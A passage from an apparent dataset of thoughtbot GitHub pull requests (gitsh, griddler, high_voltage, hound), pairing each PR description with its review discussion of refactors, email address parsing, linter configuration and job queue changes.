this extremely simple.', ""@Adam89 @sgrif This is looking really good. A few minor comments, and then it's good to merge. Thanks!"", 'Thanks Sean I will do that ']"
828,thoughtbot/gitsh,209.0,"This PR paves the way for making unset variables raise an error (#136) which in turn will pave the way for lazily evaluating variables in command arguments (#197).

After attempting to implement lazy variable evaluation directly it became apparent that staying consistent with the way general purpose Unix shells handle unset variables is going to introduce a lot of complexity, far more than keeping that behaviour would justify (@mike-burns never liked it anywaysee discussion on #136and I probably should have listened).

* Modify `Gitsh::Environment#fetch` and `Gitsh::GitRepository#config` to raise if no default value is given.
* Move default values from arguments to blocks to easily distinguish between there is no default and the default is set to `nil`.
* Remove `Gitsh::Environment#[]` and `Gitsh::MagicVariables#[]` entirely, in favour of `#fetch` methods.
* Update `Gitsh::Environment#fetch` to read from magic variables, which were previously only accessible via `#[]`.","[""Spec failure is unrelated (it's a Ruby/readline/threading bug)"", 'Thanks for the reviews, all.']"
829,thoughtbot/gitsh,214.0,"This PR moves the error handling from the `Gitsh::Interpreter` to a `Gitsh::Commands::ErrorHandler` decorator, so that a line that contains multiple commands can continue, even if one of those commands fails.

It makes it possible to do things like this:

```
% :set b ""This is B""
% :echo $a || :echo $b
This is B
```

Fixes #213","['@gabebw Thanks for the review, Gabe. Any other feedback, or are we good to merge?', 'Oops! :+1: ', 'Thanks, Gabe.']"
830,thoughtbot/gitsh,219.0,The interactive runner will attempt to source a `~/.gitshrc` file.,"['One small comment, otherwise LGTM\r\n\r\nAlso, it looks like `InteractiveRunner` is getting kinda hefty. It might require a decent refactor, but at some point it could be worth turning it into a Command object and synchronizing the interfaces of the objects it consumes', ""Thanks for the reviews, everyone.\r\n\r\n@gabebw @teoljungberg I didn't fix everything you commented on. Do my arguments seem sound, or does this need more work?"", 'I am entirely convinced, and I award this PR my seal of approval.', 'I gratefully receive your seal of approval, and shall merge forthwith.', ""I'm convinced aswell, go ahead and merge!"", 'Thanks, Teo. Mergin\xe2\x80\x99']"
831,thoughtbot/gitsh,224.0,"- Replace `stub` with `double` from Rspec.
  - Use `spy` instead where applicable.
- Add `sequenced_double` helper to allow two arbitrary mock implementations to
  be called after each other.

Closes #215","[""Thanks for this @teoljungberg. I left a few minor comments about style, and I think the `#sequenced_double` method needs some work, but it's looking good."", '@georgebrock comments addressed, fixed and pushed', ""@teoljungberg Looking good! Looks like there's a legitimate spec failure, then this is ready to merge.\r\n\r\nI guess it should probably be squashed down; I don't think keeping the separate commits will make the history more clear."", 'Thanks for the feedback @georgebrock, merging']"
832,thoughtbot/griddler,102.0,"Too many times we've found that the users tend to move the reply address to the cc list.
That is the case that I'm trying to cover. To avoid monkey patching every time.

The behavior:
email.cc will default to an empty Array if it is not present.
email.cc will return a list of pure email addresses","['+1', 'Suggested changes, ready for a second try :smile:, what do you think @calebthompson?', ""That was snappy! One more minor change and I'm happy. Please squash to a single commit. http://robots.thoughtbot.com/5-useful-tips-for-a-better-commit-message"", 'Good to go when you squash.', '@calebthompson Squashed and ready to be merged. :wink: ', 'Thanks!', 'Thanks to you for this ""gem"" :sunglasses: ', 'This is great, thank you!', ""Just curious here, why wasn't this handled in each of the adapters? It's the job of the adapters to normalize to, from etc and it seems logical that cc would be handled there as well. "", ""As an example, Postmark doesn't send through Cc as a header, but instead as a full-class citizen with To and From. With this implementation, I can't get the Cc from Postmark. ""]"
833,thoughtbot/griddler,45.0,"Based on @calebthompson comments on #44, here's a new PR with just the changes needed to fix the Postmark adapter.

On 26ab1dc I go into much more detail on why we should use the `To` param from Postmark and not the parsed `ToFull` they give us.","[""Since I don't have a way to check this myself, pinging @r38y. Do you mind taking a look at this change? @nhocki's change makes sense but I'd appreciate the extra set of eyes."", 'The reason I use ""ToFull"" is because Postmark will get rid of ""To"" eventually. Here is the documentation on it:\r\n\r\n![to-documentation](https://f.cloud.github.com/assets/926/304228/ab94331c-9637-11e2-8918-3273da6c5915.png)\r\n\r\nI think you are correct in fixing the single value vs array. It looks like ""ToFull"" could also be an array. \r\n\r\nHowever, I\'m not sure how griddler wants to handle an array coming in... it kind of expects ONE to email address and I think with most cases, that is what people want in their app. If there were TWO ""to"" addresses, what should happen?\r\n\r\nI\'ll ask Chris (the owner of Postmark) how often ToFull comes through as an array. ', 'Great info. We had a discussion on multiple addresses in #44, if you\'d like to catch up there. Basically, Griddler shouldn\'t care that there are multiple addresses, just pass them on. `EmailParser` in a host app should know to ignore ""garbage"" addresses.', 'Oh, and I think even if you pass through the ""To"" with name and email, griddler will strip out the name part of the email and that is what you get on the other end. So including the name shouldn\'t be necessary. \r\n\r\nA thought I had the other week was what if we could pass along the original params in case EmailParser wanted the name. Maybe pass it through as params[:original_params]?', '`email.to` can be configured to send the hash with all of that information: https://github.com/thoughtbot/griddler/blob/master/lib/griddler/email_parser.rb#L14-L23\r\n\r\nAnd sorry, I meant `EmailProcessor`', 'Ahh, ok, cool. Maybe the README should be updated to indicate that? ', 'https://github.com/thoughtbot/griddler#configuration-options', ':) I wish we could ""like"" comments. ', 'I hadn\'t seen the deprecation of the `To` param. So, in that case I think the adapter should stick to `ToFull`. Just worth mentioning that Postmark will *always* send an array on `ToFull`, even with only 1 recipient. I think their documentation have that wrong.\r\n\r\nThis is what I got on the emails test I was doing and why I found this bug:\r\n\r\n```json\r\n  ""ToFull"": [\r\n    {\r\n      ""Email"": ""someemail@example.com"",\r\n      ""Name"": """"\r\n    }\r\n  ],\r\n```', 'Good call. So in summary, will email.to always have an array of ""to"" email addresses and our custom processor will handle looking at each in the array? Do the other adapters need to be updated?', ""Maybe one option here would be to merge the `email` and `name` from `ToFull` and send that to Griddler parser? This way the `hash` config option would have all the information.\r\n\r\nAnd yes. I'll submit a new pull request with the updated adapters."", 'But if we find a ""common representation"" of the `normalized_params[:to]` that we can use on the parser would be much better IMO. This way we only build the array once.\r\n\r\nI think a comma separated string would be a good choice (since is what you would expect when having multiple email recipients)', ""I just had a quick conversation, and we think that `to`, `cc`, `bcc` should always be an array, even for a single element. Other processors should be updated, and this may be a backward-incompatible change so we'll make sure to publicize it, so that won't be able to be released immediately.\r\n\r\n@nhocki is this something that you can work around with your EmailProcessor in your app, or is it _really_ broken on Griddler's end?\r\n\r\n@jayroh, @theycallmeswift pinging you about this as a heads-up."", 'Yeah, I think merging ""email"" and ""name"" would be good. When I created the adapter I was kind of wanting the name to be passed through since the app I\'m going to use this on could benefit from the name.', ""@calebthompson In my app I'm using my fork that sends `to` as an array. So I'd have no problem with this change. Would you think having those fields (`to`, `cc`, and `bcc`) passed as comma separated emails (with/without names) from the adapters to the parser is a good solution?\r\n\r\nThis way we can add the methods to the Griddler parser and manage all adapters."", ""It seems cleaner to pass an array all the time, so that only in one place do we need to deal with separating things, then we can always assume that we have multiple addresses from then on and things won't break for single recipients.\r\n\r\nI'll think about it, but what is the benefit you see to keeping them as a comma delimited list?"", 'It\'s just how I would expected a string of emails would be.\r\n\r\nPostmark parses the emails, but I have no clue if other services do too. If they don\'t, they\'ll probably send the ""to"" as a string with comma separated emails.\r\n\r\nAdapters could also use the method on the parser though...', 'A comma-separated list is basically a serialized array... it makes sense to me to use the real data structure whenever possible. The other adapters could certainly form the same thing. ', 'I think part of the adapters job just needs to be that they create the array of strings, regardless of how the service parses:\r\n\r\n```ruby\r\n[""First Last <first@last.com>"", ""some@body.com"", ""<another@person.com>""]\r\n```\r\n\r\nThen EmailParser can do its magic to provide the email in the configured format for each string.', 'Great. Perfect then. @r38y so merging the name and email from Postmark sounds good to you?', ""@nhocki Yup! Thanks for doing this. It is something I thought about (I missed the array part though!) but wasn't quite sure how to solve. \r\n\r\nBTW, when general questions about how something should be handled comes up, what is the best way to discuss them? Create an issue?"", 'In the absence of a chat room or mailing list, an issue makes sense.', ""Ok, let me fix this PR to use the `ToFull` again, merging the name and the email and keep it compatible with the current *only one to* API.\r\n\r\nThen I'll create a new one to make the Griddler API changes, sounds right?"", ""It does, thanks man.  \r\n\r\n--  \r\nCaleb Thompson\r\nSent with Sparrow (http://www.sparrowmailapp.com/?sig)\r\n\r\n\r\nOn Tuesday, March 26, 2013 at 1:48 PM, Nicol\xc3\xa1s Hock Isaza wrote:\r\n\r\n> Ok, let me fix this PR to use the ToFull again, merging the name and the email and keep it compatible with the current only one to API.\r\n> Then I'll create a new one to make the Griddler API changes, sounds right?\r\n>  \r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub (https://github.com/thoughtbot/griddler/pull/45#issuecomment-15474302).\r\n>  \r\n>  \r\n>  "", 'Ok, rebased and re-push. But I\'m not happy with the `full_email` method though. I want it to have the name quoted whenever possible but have no idea how to make it nicer. Any suggestion on this?\r\n\r\nPostmark will always send the `Name` param, but it may be blank. And having `"""" <email@example.com>` is not nice.\r\n\r\nHere\'s the method for the ones reading this on their email:\r\n\r\n```ruby\r\ndef full_email(contact_info)\r\n  email = contact_info.fetch(:Email)\r\n  if contact_info[:Name].blank?\r\n    email\r\n  else\r\n    ""\\""#{contact_info[:Name]}\\"" <#{email}>""\r\n  end\r\nend\r\n```', 'Will ```parse_address``` handle the empty name so it comes through ""clean""?', ""According to my few minutes of looking through email headers on GMail, it appears that the quotes aren't a part of the spec. I'd just omit them."", 'Any chance the gem could be released as ""1.0"" once everything is array since it has some breaking changes? Or do you want 1.0 to be a more significant update?', ""@nhocki This lgtm. Please squash once more and I'll merge.\r\n\r\n@r38y Let me talk with @jayroh about it. I'm thinking since we're pre-1.0 we can call this a minor version and release."", ""I think we're going to tag 0.4.1 for this fix, and call the array-of-emails change 0.5.0 when that is ready.""]"
834,thoughtbot/griddler,55.0,"spec/features/adapters_and_email_spec.rb:9 was intermittently leaking the
configuration across tests and causing the controller spec to think it was
using the mandrill or cloudmailin adapter. Instead it should default to
sendgrid, which matches up more closely to the sample email params we're
posting to the action.

Further changes:

* Formatting and spacing, newlines after blocks, etc.
* Limit to 80 chars
* Move a method up in mandrill adapter spec for easier reading/comprehension","['Gentlemen - one more review please?\r\n\r\n@gabebw @theycallmeswift @calebthompson', ':sailboat: ', 'Pleasure doing business with you, gents.\r\n\r\n![awkward](http://i.imgur.com/dEkKjDi.gif)']"
835,thoughtbot/high_voltage,128.0,"`#concern_reload` would execute the Rails `caches_page` and
`caches_action` methods multiple times resulting in multiple callbacks
being associated with the controller. This lead to inconsistencies.

Enabling `ActionController` caching by default so that we don't need to
repoen the class in order to get caching working.

This also refactors the `action_caching` to test via spying rather than
testing caching directly.","[""I'm most interested in whether we're cleaning up correctly now, clearing the cache.\r\n\r\nNot sure what downsides there are to stubbing the controller under test in this case, but maybe there's some ideas in [Don't Stub the System Under Test](http://robots.thoughtbot.com/don-t-stub-the-system-under-test) like extracting a class?"", 'Looks good to me. Ready to squash and merge at your discretion. Or, if you change the mocking and want another review, let me know.']"
836,thoughtbot/high_voltage,155.0,"@dgalarza this fixes the issue we're seeing with Rails 3 users. 

* Add custom require for Rails 3

https://github.com/thoughtbot/high_voltage/issues/146",[':+1: ']
837,thoughtbot/high_voltage,178.0,"Visiting page_ids made entirely up of invalid characters gets sanitised into an empty string, so it looks for a template called ""pages/"". This raises a missing template error (because it doesn't match the regex checking that it isn't a missing partial).

This commit adds a check to see if the page_id is empty after sanitisation, and raises and error if it is -- which is caught and turned into a routing error.","['Thanks for the pr @prydonius. Sorry for the delay. Would you mind updating to handle the style issues Hound commented on? Thanks!', 'No worries, @dgalarza! Rebased and fixed the style issues.', 'Thanks for the update @prydonius. Do you feel comfortable rebasing and squashing to prep for a merge.', '@dgalarza is this ready to be merged in now?', ':+1: thanks for the contribution @prydonius ']"
838,thoughtbot/high_voltage,82.0,,"[""@masonforest overall this looks good. I think its a nice addition to the `high_voltage` gem! I've left a few comments around styles, nothing major, feel free to merge in when you feel happy with it all.""]"
839,thoughtbot/hound,308.0,"https://trello.com/c/5R0ophhT

![hound-menu](https://cloud.githubusercontent.com/assets/1174461/3446928/bf36d7c2-0147-11e4-8b9c-4e4be7446ce5.gif)","['A few comments. Looks really good!', '@gylaz Made some edits based on your comments. Good to merge?', ':thumbsup: ', '@gylaz Hah, sneaky :wink: ']"
840,thoughtbot/hound,349.0,"A pure refactoring that should not add or remove behavior. Intended to make it
easier to add new style guides such as CoffeeScript, JavaScript, Sass, and
Markdown.

* Remove `relevant_line?` method that duplicates `modified_line_at`.
* Replace `ruby?` method with builder that determines style guide based on file
  extension.
* Remove extra `FileViolation` object, which added to the chains of objects and
  things to stub.
* Collapse `LineViolation` into newly named `Violation`.
* Introduce `StyleGuides::Null` object to fall back on for files we can't
  review.","['@croaky I like it. I have a couple questions, but looks great, thanks. :+1: ', '@salbertson Care to review again?', 'I\'ve tested this on staging and it still works like before. I\'m going to take your previous comment as a ""looks good to merge"" and I\'m merging so I can start to play with the CoffeeScript style guide.']"
841,thoughtbot/hound,354.0,"* Use [CoffeeLint] to keep to a community-supported open source standard.
* Propose a `.hound/ruby.yml` and `.hound/coffee.json` naming convention.
* `.hound.yml` will still work (backwards compatible) but would now be
  considered legacy / deprecated.

[CoffeeLint]: http://www.coffeelint.org/","[""> Should PullRequest do the memoizing instead?\r\n\r\nYes, that's much better. Good idea. Done in c21acd7."", ""Thanks @croaky and @Koronen for working on this!\r\n\r\n@croaky, what's the benefit of having separate config files for each language?"", ""> what's the benefit of having separate config files for each language?\r\n\r\nDifferent linters may have different formats for their config files. Rubocop uses YAML. CoffeeLint uses JSON. So, we need to `YAML.load`/`JSON.parse` them differently. It also seems cleaner to me."", ""@salbertson I've tested this pretty heavily on staging. I just added a feature flag for CoffeeScript that we can control by adding GitHub organizations to a comma-separated list in a Heroku config variable. I figure we'll want to start with thoughtbot in production but potentially allow others to test it if they want, before we roll it out to all users. Want to take a look and give a final yes/no on this PR?"", '@croaky I think a single configuration file would be easier for users to maintain. Thoughts?', '> I think a single configuration file would be easier for users to maintain. Thoughts?\r\n\r\nI was thinking that people might already have Rubocop or CoffeeLint config files. They can just copy it over into this directory structure and things would work.\r\n\r\nDifferent linters may have different formats for their config files. Rubocop defaults to YAML. CoffeeLint defaults to JSON.\r\n\r\nIt also seems cleaner to me to be able to see config on a per-language basis rather than mixing into one file.\r\n\r\nI could also see us not relying on config files in the source code repo and instead providing an entirely web-based configuration view. Search for the error, see which language(s?) it applies to, toggle it on and off, let us worry about the implementation. Could include a `configure` link on every comment that lets team members configure that guideline without editing the source code of their repo.', 'Agreed with @croaky. Recreating a file format seems unnecessary.', 'I would rather have things has close to the libraries defaults as possible (eg: use a `.rubocop.yml` and `.coffeelint.json`) (or better: `.cson`).\r\n\r\nSo Hound is ""just"" a CI server for style formatting and not it\'s own library.\r\n\r\nBut I would totally understand the choice of a single `.hound.yml`, maybe it should support both.\r\n', 'I agree with @Dorian. We already have **coffeelint.json** in the root of our repository to configure linting for editors.\r\n\r\nWe also added a **.rubocop.yml** file containing:\r\n```yaml\r\ninherit_from: .hound.yml\r\n```\r\n\r\nWe would rather just use `.rubocop.yml`. If there is some Hound-specific configuration, `.hound.yml` could be the place for that.\r\n\r\n\r\n', 'There is more discussion about configuration [here](https://github.com/thoughtbot/hound/pull/337).', 'any update?', '@gylaz Do you think you can push this over the finish line this week based on our conversation today?', ""@croaky I've opened #380 to push the addition of CoffeeScript forward."", 'Awesome, thanks. Closing this one in favor of #380.']"
842,thoughtbot/hound,389.0,"![screen shot 2014-09-12 at 12 27 49 pm](https://cloud.githubusercontent.com/assets/1174461/4255234/e6cf3a1e-3ab2-11e4-868a-35c769b65670.png)


https://trello.com/c/6AyMCv1t","['Looks great.', 'Looks ready to squash and merge to me.']"
843,thoughtbot/hound,402.0,https://trello.com/c/LQsUqhYU/179-support-javascript,"[':thumbsup: This is going to be sweet!', '@gylaz I made a few more changes. Let me know what you think.', 'Here it is in action, https://github.com/salbertson/life/pull/26', 'Looks good to merge.']"
844,thoughtbot/hound,420.0,https://trello.com/c/ru1udGS2/370-use-new-memberships-endpoint-when-adding-hound-to-github-teams,['Looks great! :fireworks: ']
845,thoughtbot/hound,477.0,https://trello.com/c/xXsDq7fl/410-add-more-faqs,"[""I think some of these paragraphs that end in a `link_to` are missing trailing periods.\r\n\r\nThanks for fleshing this out, @adarsh. I've been seeing the usefulness and necessity of a good FAQ on a few products, recently. Glad to see it getting some love in Hound."", '@gylaz I couldn\'t find any specific GitHub access limits, so I added the ""anecdotally, we\'ve seen > 250 files have problems"" in bd4300c', 'Left a few more suggestions. Looks good to me.', ""Thanks all - I'm going to get this merged in with the edits, hopefully this is helpful to the users.""]"
846,thoughtbot/hound,490.0,"Allows a user to configure hound to ignore specified JavaScript files
from being run through the jshint through an ""exclude"" configuration.

Example configuration:

```yaml
java_script:
  enabled: true
  exclude:
    - ""app/assets/javascripts/*.js""
```","['@dgalarza Would it be possible to move the exclude option into `config/style_guides/javascript.json`? Or does JSHint have problems with that?', 'Do we want to make this a whitelist instead of a blacklist?', '@croaky What advantages do you see for whitelisting?\r\n\r\nMost of the linters use blacklist for exclusion, so it come off more familiar. If I enable a linter on a repository, my expectation would be that everything is reviewed. With whitelist, user needs to do more configuration at the start. However, that has the benefit of being opt-in.', ""@gylaz Not sure. It seems like in other places, we end up going with a whitelist approach after trying blacklists first: `attr_acessible` gave way to Strong Parameters, Capybara Webkit's URL blacklisting is supposedly converting to a whitelist, etc.\r\n\r\nIf the Linters blacklist, I agree that's a stronger convention to follow."", ""> @dgalarza Would it be possible to move the exclude option into config/style_guides/javascript.json? Or does JSHint have problems with that?\r\n\r\nI wasn't sure if we wanted to mix in JSHint specific configuration with Hound specific configuration. If we do, then I'd be glad to move this into the `config/style_guides/javascript.json`. I'll double check it doesn't collide with anything in JSHint.\r\n\r\n> Do we want to make this a whitelist instead of a blacklist?\r\n\r\nI agree that if I added a linter to my repo that I'd expect it to review everything. It would seem to time confusing and to easy to forget to add specific files to a whitelist for linting."", 'To expand a little further on my thoughts before. In our documentation we instruct the user to use a linter specific config to customize how it works with hound. imo it seems confusing to have ""hound specific"" configurations added to these configuration files as well.', ""I definitely see the downsides in mixing the two, yet the idea behind `.hound.yml` is to be high level config that enables the linters and provides the appropriate configuration file path. I'd like to, if possible, to avoid mixing where the configuration for a specific language goes. Thoughts?"", ""Sounds good, I'll work on extracting it out into the jshint configuration."", ""@gylaz yesterday @tabfugnic and I were pairing on this and we found out that JSHint actually provides some support towards ignoring files. It's not a well documented feature, and it does not appear that the `jshintrb` gem supports it. However, JSHint by default will look for a file named `.jshintignore`, or you can provide an option `--exclude-path` when running JSHint from the command line.\r\n\r\nEven though the `jshintrb` gem does not support it, it may make sense to follow the conventions that JSHint has provided. We'll have to filter out the files on our end in hound, however we may want to utilize a `jshintignore` file instead of providing our own `exclude` option. What do you think?\r\n\r\nWe were thinking of something like:\r\n\r\n```yaml\r\n# .hound.yml\r\njava_script:\r\n  enabled: true\r\n  config_file: '.javascript.json'\r\n  ignore_file: '.jshintignore'\r\n```\r\n\r\nWe could either automatically look for a `.jshintignore` file within the repo if the user has not provided the `ignore_file` configuration option in `.hound.yml` or use a file path specified.\r\n\r\nWhat are your thoughts on this?"", ""@dgalarza That makes sense to me. If we can support the config files that the linter uses, then it's a benefit to those that use the linter locally."", 'This is ready for another review', 'Great job, @dgalarza. Ready to merge.']"
847,thoughtbot/hound,497.0,"https://trello.com/c/A08LSOcn/

Load in a thoughtbot specific configuration for all linters so that when changes to the thoughtbot style guides occur, hound can lint against the most up to day style guide, without affecting other customers.

Notes:

* Not sure if this is the best way to handle checking if a project is thoughtbot or not and to load a configuration based on this.
* Not sure if this is the best way to handle testing these cases as well.
* I simply copied over the existing configurations for rubocop, JShint, and Coffeelint into the new `config/style_guides/thoughtbot` directory. There are no changes to any of these configurations. I figured it could be handled as a separate PR. For example: https://github.com/thoughtbot/hound/pull/491

Any suggestions / feedback welcome. Especially around the first 2 notes.","['That new object really seemed to simplify the control flow of the code. Very easy to read now and understand responsibilities.\r\n\r\nOnly other way I can think to get owner is via Repo#full_github_name or whatever the field is. Could be split on /. Not sure if that is better or not.', 'I lean towards using the repository owner fields instead of splitting the `full_github_name`. It feels like the repository owner is provided for exactly our use case where as splitting `full_github_name` is a bit of a work around.', 'Yup, I agree with your assessment.\r\n\r\n> On Dec 2, 2014, at 7:17 AM, Damian Galarza <notifications@github.com> wrote:\r\n> \r\n> I lean towards using the repository owner fields instead of splitting the full_github_name. It feels like the repository owner is provided for exactly our use case where as splitting full_github_name is a bit of a work around.\r\n> \r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub.\r\n> ', 'This looks clean to me. Do you see any final opportunities to make it easy to remove this code at a later date when a more permanent solution is written? I\'m guessing we\'ll just search for ""thoughtbot"" in the repo. Or could the commits be rebased in a way where we could just revert one?', 'I just did a cursory rebase / squash rotation and cleaned up the commits a bit. I think it would be ok to squash the thoughtbot specific configuration into a single commit instead of the language based commits (one commit for thoughtbot rubocop, one for javascript, etc). That way, it could be reverted out.', 'Yeah, something like that sounds good to me. Overall, this looks ready to go to me. @gylaz?\r\n\r\n> On Dec 2, 2014, at 7:46 AM, Damian Galarza <notifications@github.com> wrote:\r\n> \r\n> I just did a cursory rebase / squash rotation and cleaned up the commits a bit. I think it would be ok to squash the thoughtbot specific configuration into a single commit instead of the language based commits (one commit for thoughtbot rubocop, one for javascript, etc). That way, it could be reverted out.\r\n> \r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub.\r\n> ', ""Thanks for the feedback @gylaz, I've updated accordingly."", ""Merge! Deploy! Maybe alert the whole team in Basecamp.\r\n\r\n> On Dec 3, 2014, at 11:55 AM, Damian Galarza <notifications@github.com> wrote:\r\n> \r\n> Thanks for the feedback @gylaz, I've updated accordingly.\r\n> \r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub.\r\n> "", 'One more small comment, then GTG.']"
848,thoughtbot/hound,511.0,"* `repo:cleanup_orphans` to remove repos with no memberships.
* `repo:cleanup_duplicate_github_ids` to remove duplicate repos
  with the same `github_id`.",['Minor comments. Ready to squash and merge!']
849,thoughtbot/hound,525.0,"* Hound users currently receive no feedback when their Ruby, JavaScript,
  and CoffeeScript configuration files are invalid. This commit
  introduces a new feature to address this disconnect:
  When a config file is empty or can't be parsed, the GitHub status will
  be changed to ""failure"".
* Validate repo config in `BuildRunner#run`. If config is invalid,
  create failure status and create build record.
* Add `RepoConfig#validate` and `RepoConfig#errors`
* Add `GithubApi#create_failure_status`
* https://trello.com/c/JLt3FVUb/397-use-status-api-to-tell-user-when-custom-config-is-broken",['Closing this for now. Will re-open when refactoring is complete.']
850,thoughtbot/hound,493.0,"  * Makes `Violation` inherit from `ActiveRecord::Base` and adds associated
    table
  * Adds `has_many :violations` association to `Build`
  * Updates creation of `violations` in `style_guide`'s
  * Adds `violation` factory

EDIT: this PR also renames the column `builds.violations` to `builds.violations_archive` allowing us to migrate the historical violations at a later date while making sure we're not still using this column in production.

https://trello.com/c/OLdRI0mO/336-split-out-violations-into-separate-table","['@srt32, any update on this?', '@salbertson I should be able to wrap it up tomorrow AM', ""@croaky @gylaz @salbertson could you take another look? I've squashed and rebased implementing @gylaz's idea of not persisting code on the `violation`'s `line` anymore. cc/ @malandrina "", '@srt32 Do we need to take Hound down when releasing these? In particular, does the code depend on the migration?', '@gylaz the migration will require a maintenance window because 1) the migration itself may take a non-trivial period of time (multiple seconds?) and 2) when we create a new build (https://github.com/thoughtbot/hound/blob/st-ct-violations-table/app/services/build_runner.rb#L8) we persist the associated violations (which uses the new table). ', 'Closed accidentally.  Reopened.', '@srt32 Cool. Want to pair on releasing this towards the end of the day?', ':+1: ']"
851,thoughtbot/hound,551.0,"As we are on rails 4.2 we can use `ActiveJob` and remove our custom `JobQueue` code.

This PR needs to be review carefully and needs more testing on staging before merging into master.","['@arunagw, the before and after code looks very similar. What do we get from `ActiveJob` that makes it worth changing?', ""This is looking good. We'll need to give a good test run on staging."", ""@salbertson @gylaz \r\n\r\nThe main problem I can see here is that we are not utilizing the `ActiveJob`. We are going to have some custom code inside every job class. Like `rescue Resque::TermException` and I couldn't find any workaround for that.\r\n\r\nDo you have any idea how we can solve this? I don't want to put `rescue Resque::TermException` in every job class because I cannot switch to another adapter easily with this custom code.\r\n  "", 'Does `ActiveJob` now wrap errors like `Resque::TermException` into some `ActiveJob` related error?\r\n\r\nAlso, what is the main benefit of switching to `ActiveJob`?', 'The main benefit of using ActiveJob is making it easier for other people to run Hound with other job queue adapters. All one would have to do is changing the ActiveJob queue adapter and remove the `rescue` clause specific to `Resque`.', ""Since we're not really planning on moving off of Rescue, I'm wondering about the value of this work. I like the general re-factoring/abstraction, but if some things are any gotchas, or risks in deploying this, I'm not sure this is worth merging."", ""There is a problem using `ActiveJob` right now that we can't use `ActiveJob` reference everywhere and we have to use `Resque` at few places. Specially capturing `Resque::TermException`.\r\n\r\nAlso right now we can't really know which adapter we are using so we need to keep `Resque` references in test as well to run jobs.\r\n\r\nI would suggest we can close this PR fir now and wait for fixes or wrap around `ActiveJob` and write some code to get it working.\r\n\r\n"", ""What exactly needs to be fixed, could you clarify? I'd like to help.\r\n\r\nIt bothers me as well to have `Resque` exceptions being rescued when adding a layer that should abstract `Resque` completely, but it looks to me more like a `Resque` problem than anything else i.e. if we replaced `Resque` for `Sidekiq` we wouldn't have to add any `Sidekiq` specific code in our jobs."", '@lunks \r\nThe only problem I feel is that we have remaining trace of `Resque` in every job and in test helper. \r\nWe can also remove this in second attempt.\r\nI will clean this PR for the first attempt and will keep the `Resque` specific code for now.\r\n\r\nIf you want we can work on this together in your fork.', ""No problem using yours, let's hope I get some free time to work on it. :)\r\n\r\nIs it a possible solution to ditch `Resque` and use `Sidekiq`?\r\n"", ""I lie of all the issues we've been having with Resque recently, I'd be willing to explore switching to Sidekiq."", 'After reviewing we could merge this PR and create another one to replace `Resque` with `Sidekiq`.', 'Thanks @lunks and @arunagw for moving this along! I think if we can use ActiveJob to its strengths and avoid littering the code with `Resque` references this will be a good change.']"
852,thoughtbot/hound,554.0,"Pull requests with many style violations pose two problems:

* users feel overwhelmed by the amount of comments made by hound
* hound approaches or reaches the GitHub api rate limit

This change is an attempt to alleviate both problems, by only submitting
a maximum number of comments per build. Potential downsides could be:

* users continue to feel overwhelmed when they fix the first batch of
  issues, and receive another batch
* no indication of how many violations remain
* grabbing the first 10 violations is naive, and could lead to more than 10 comments on a PR. e.g. if a new commit is pushed that adds violations that occur before the existing 10, they will be commented

Potential todo items:

* indicate in the PR how many violations there are, if it's more than
  the maximum
* be ""smart"" about which violations are commented on. currently the
  first 10 are taken, but we can probably come up with something better
  without much effort",[':+1: ']
853,thoughtbot/hound,567.0,"Extract the logic out of the `GithubApi` into a service. `GithubApi` should
only be a wrapper over Octokit methods and not handle complex logic.
This allows us to test that logic easier in isolation without stubbing
external requests.",['LGTM']
854,thoughtbot/hound,575.0,"This isn't fully built, designed or tested but I wanted to get some early feedback on the approach before getting too far.

![update card](https://cloud.githubusercontent.com/assets/154463/5811535/3d4dfe60-a00d-11e4-9fa8-b3e7376994de.gif)","['Very cool. The UI looks great and the interaction seems simple. I say push forward on it.', '@croaky @gylaz, let me know what you think. I added our first JavaScript tests too.', 'I like it.', 'Anything we need to add to the `Rakefile` so the JavaScript specs are run on CI?', 'Maybe get a review of the Angular code from @gylaz. Other than maybe a unit test for `update_card` and any `Rakefile` / JS-tests-on-CI changes, this looks ready to merge to me.', '@croaky, I tested `update_card` and created test helper class for testing interaction with Stripe API.', '@croaky, I thought `jasmine-rails` would magically add the rake task as a dependency to the default one, guess not. I added the JavaScript test suite task to the default rake task, https://github.com/thoughtbot/hound/commit/b9a13a87e4b2952d657721d544aeb63bb4087a7c.', '@croaky and @gylaz, thanks for the review!']"
855,thoughtbot/hound,593.0,,"['Looks good. What do you think about limiting the amount of weeks to the last 12 or so? That report is getting pretty lengthy. Probably worth of a separate PR though.', 'Thanks dudes.']"
856,thoughtbot/hound,605.0,"This should help address the confusion around configuration.

Here's an overview of the changes:

* All languages are now enabled by default and configuration files for each language have a naming convention.
* Removed extra layer of configuration, `.hound.yml`.
* Disabled most preferences by default and allow individual teams to easily configure Hound using sample configuration files. This change should make the effective style guide more clear; you shouldn't have to search around RuboCop's' config trying to find what rules to override.
* Updated documentation.
* Simplified `StyleGuide` classes and made them more consistent.
* Moved responsibility of excluding files to individual `StyleGuide` classes.

The migration path will require communicating with current users about renaming their config files, if they have any.

![screenshot 2015-02-05 08 41 13](https://cloud.githubusercontent.com/assets/154463/6066153/c6eb3876-ad1f-11e4-9d9b-6f4bd956692e.png)

https://github.com/thoughtbot/hound/issues/576",[]
857,thoughtbot/hound,586.0,"This PR updates the `RepoSynchronization` process and `Build`'s to assign the
`repo` to its parent `owner` (which is either a user or an organization). Tying
the `repo` to the `owner` is a preliminary step to having `owner` level
configuration.

New `repo`'s and updated `repo`'s (updated via the user clicking 'Refresh Repo
List' or via a build) will have their `owner`s populated.  We'll need to
backfill the `repo`'s that are not new and are not refreshed. I propose we merge
this PR as is and then have follow up work that adds an idempotent rake task
(which requires calls to GitHub) that will backfill `repo`'s missing
`owner_id`'s. Once the data is backfilled, we can apply a `null: false`
constraint to `repos.owner_id`.

Part of
